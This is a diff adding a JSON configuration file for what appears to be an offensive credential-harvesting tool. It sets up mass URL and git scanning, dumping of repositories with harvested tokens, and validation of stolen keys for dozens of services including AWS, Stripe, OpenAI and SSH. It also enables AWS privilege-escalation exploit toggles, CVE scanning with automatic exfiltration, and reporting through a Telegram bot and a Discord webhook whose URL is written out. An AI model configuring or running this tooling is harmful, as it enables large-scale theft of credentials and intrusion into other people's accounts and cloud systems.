@@ -1,0 +1,280 @@
+{
+  "input": {
+    "urls_file": "",
+    "patterns_file": ""
+  },
+  "output": {
+    "directory": "hits"
+  },
+  "performance": {
+    "threads": 250,
+    "http_concurrent": 100,
+    "timeout_seconds": 10,
+    "smtp_concurrency": 20,
+    "aws_concurrency": 10,
+    "checker_concurrency": 50,
+    "git_scan_concurrency": 300,
+    "reconstruct_concurrency": 100,
+    "object_cache_max_mb": 4096,
+    "max_idle_conns_per_host": 150,
+    "max_conns_per_host": 150,
+    "conn_idle_timeout_sec": 60,
+    "max_response_body_mb": 50
+  },
+
+  "scan_limits": {
+    "_comment_sizes": "All sizes in bytes. 0 = unlimited where applicable.",
+
+    "max_file_size_bytes": 10485760,
+    "max_blob_size_bytes": 10485760,
+    "max_patch_size_bytes": 5242880,
+    "max_zipball_size_bytes": 524288000,
+    "max_zip_entry_size_bytes": 52428800,
+
+    "_comment_binary": "'extract_strings' = extract ASCII from binaries then scan. 'skip' = ignore binaries. 'force_text' = scan raw bytes as text.",
+    "binary_probe_bytes": 512,
+    "binary_policy": "extract_strings",
+    "min_string_length": 10,
+    "min_extracted_result_len": 20,
+    "max_binary_extract_bytes": 2097152,
+
+    "_comment_history": "0 = unlimited commits. 'all' = diff every merge parent. 'first' = diff first parent only.",
+    "max_history_commits": 0,
+    "scan_merge_parents": "all",
+
+    "_comment_branches": "'all' = scan every branch. 'named' = only branches in branch_whitelist. 'head_only' = skip all extra branches. 0 = no limit.",
+    "branch_scan_mode": "all",
+    "branch_whitelist": ["dev", "develop", "staging", "test", "qa", "release", "prod", "production", "main", "master"],
+    "max_branches": 0,
+
+    "_comment_git_sources": "Toggle scanning of specific git data sources.",
+    "scan_submodules": true,
+    "scan_git_notes": true,
+    "scan_stash": true,
+    "scan_tag_messages": true,
+    "scan_git_config": true,
+
+    "_comment_regex": "Max regex matches per pattern per content chunk. Higher = more thorough but slower.",
+    "regex_matches_per_pattern": 10,
+    "dedup_mode": "global_content",
+    "max_dedup_entries": 500000,
+
+    "_comment_deobfuscation": "Limits for base64/hex decoding and archive extraction depth.",
+    "max_base64_candidates": 50,
+    "max_hex_candidates": 20,
+    "max_base64_decode_bytes": 1048576,
+    "max_archive_depth": 5,
+    "max_archive_content_bytes": 104857600,
+
+    "clone_retries": 3,
+    "clone_retry_backoff_ms": 200,
+    "zipball_timeout_seconds": 300,
+
+    "_comment_file_filter": "File filtering uses excluded_extensions.txt — edit that file to add/remove extensions. Everything not excluded is scanned."
+  },
+
+  "git_scanner": {
+    "enabled": true,
+    "scan_head": true,
+    "scan_basic_refs": true,
+    "scan_config": true,
+    "scan_description": true,
+    "scan_extended_refs": true,
+    "scan_pack_files": true,
+    "scan_index": true,
+    "scan_history": true,
+    "scan_archives": true,
+    "max_history_depth": 50,
+    "max_objects_to_scan": 1000,
+    "max_file_size_mb": 10,
+    "max_archive_size_mb": 1024,
+    "skip_binary_files": true,
+    "max_repos_per_token": 100,
+    "max_concurrent_token_dumps": 10,
+    "max_concurrent_repos_per_token": 5,
+    "api_dump_mode": "immediate",
+    "use_new_dumper": true
+  },
+
+  "git_dumper": {
+    "enabled": true,
+    "simultaneous_tokens": 15,
+    "simultaneous_repos": 25,
+    "background_workers": 16,
+    "background_queue_size": 512,
+    "auto_validate_tokens": true,
+    "rate_limit_wait": true,
+    "archive_fallback": true,
+    "scan_commits": true,
+    "scan_issues": true,
+    "max_commit_depth": 100
+  },
+
+  "dumper": {
+    "_comment": "'mode': off|shallow|full|bare|api|hybrid. 'filter': all|private|recent. Use 'api' for low bandwidth (no git clone, API only).",
+    "enabled": true,
+    "mode": "full",
+    "filter": "all",
+    "max_repos": 100,
+    "max_size_mb": 5000,
+    "recent_days": 365,
+    "scan_history": true,
+    "keep_clones": false,
+    "parallel": 30,
+    "clone_dir": "hits/clones"
+  },
+
+  "checkers": {
+    "enabled": true,
+    "github": true,
+    "gitlab": true,
+    "bitbucket": true,
+    "gitea": true,
+    "gogs": true,
+    "gerrit": true,
+    "azure_devops": true,
+    "codecommit": true,
+    "aws": true,
+    "aws_enum": true,
+    "digitalocean": true,
+    "sendgrid": true,
+    "brevo": true,
+    "mailgun": true,
+    "mailchimp": true,
+    "postmark": true,
+    "sparkpost": true,
+    "smtp": true,
+    "telegram_bot": true,
+    "twilio": true,
+    "shopify": true,
+    "slack": true,
+    "discord": true,
+    "stripe": true,
+    "square": true,
+    "openai": true,
+    "claude": true,
+    "grok": true,
+    "gcp": false,
+    "vercel": true,
+    "vonage": true,
+    "plivo": true,
+    "messagebird": true,
+    "sinch": true,
+    "telnyx": true,
+    "mailjet": true,
+    "newrelic": true,
+    "datadog": true,
+    "grafana": true,
+    "fofa": true,
+    "shodan": true,
+    "ssh": true,
+    "twitter": true
+  },
+
+  "git_tokens": {
+    "_comment": "Map self-hosted git hosts to their service type. Keys = hostname, values = github|gitlab|bitbucket|gitea|gogs|azuredevops",
+    "custom_hosts": {}
+  },
+
+  "webhooks": {
+    "enabled": true,
+    "mute_git_telegram": false,
+    "telegram": {
+      "enabled": true,
+      "bot_token": "",
+      "chat_id": ""
+    },
+    "discord": {
+      "enabled": false,
+      "webhook_url": "https://discord.com/api/webhooks/1543563099003424778/UM-Qgis1vUZJsGPKfIwVCznsHFFSkU4trQRuFxNagRvGgO6JqrPHgwpK2aATciN-FgEq"
+    }
+  },
+
+  "proxy": {
+    "enabled": false,
+    "url": "",
+    "file": "",
+    "protocol": "http",
+    "checkers": "all"
+  },
+
+  "aws_enum": {
+    "enabled": true,
+    "threads": 10,
+    "regions": [
+      "us-east-1", "us-east-2", "us-west-1", "us-west-2",
+      "ca-central-1",
+      "eu-west-1", "eu-west-2", "eu-west-3",
+      "eu-central-1", "eu-central-2",
+      "eu-south-1", "eu-north-1",
+      "ap-south-1",
+      "ap-southeast-1", "ap-southeast-2",
+      "ap-northeast-1", "ap-northeast-2", "ap-northeast-3",
+      "sa-east-1",
+      "me-south-1", "af-south-1"
+    ],
+    "region_concurrency": 10,
+    "timeout_seconds": 30,
+    "use_iam": true,
+    "use_s3": true,
+    "use_secrets_manager": true,
+    "use_ssm": true,
+    "use_lambda": true,
+    "use_ec2": true,
+    "use_cloudformation": true,
+    "use_codecommit": true,
+    "use_codebuild": true,
+    "use_ecs": true,
+    "use_glue": true,
+    "use_rds": true,
+    "use_sqs": true,
+    "use_amplify": true,
+    "use_exploits": false,
+    "exploit_create_keys": true,
+    "exploit_assume_roles": true,
+    "exploit_self_escalate": true,
+    "exploit_federation": true,
+    "exploit_ssm_command": true,
+    "aio_enabled": false,
+    "aio_attacker_account": "",
+    "fulldump": false,
+    "debug": false,
+    "skip_others": false,
+    "max_secrets_per_region": 25,
+    "max_ssm_per_region": 50,
+    "max_lambdas_per_region": 50,
+    "max_ec2_per_region": 5,
+    "max_cfn_per_region": 20,
+    "max_iam_users": 100,
+    "max_content_to_analyze": 0,
+    "s3_max_file_size_mb": 2,
+    "s3_max_files_per_bucket": 100,
+    "s3_bucket_concurrency": 5,
+    "lambda_max_code_size_mb": 10
+  },
+
+  "cve_scan": {
+    "enabled": true,
+    "threads": 100,
+    "timeout_seconds": 10,
+    "auto_exfil": true,
+    "check_creds": true,
+    "persist": false,
+    "probe_only": false,
+    "debug": false,
+    "verbose_debug": false,
+    "quiet_webhook": false,
+    "compact_notify": false,
+    "scan_vite": true,
+    "scan_opencode": true,
+    "scan_nextjs": true,
+    "scan_r2s": true
+  },
+
+  "envcrack": {
+    "enabled": true,
+    "threads": 20,
+    "recursive": true,
+    "max_size_mb": 50
+  }
+}
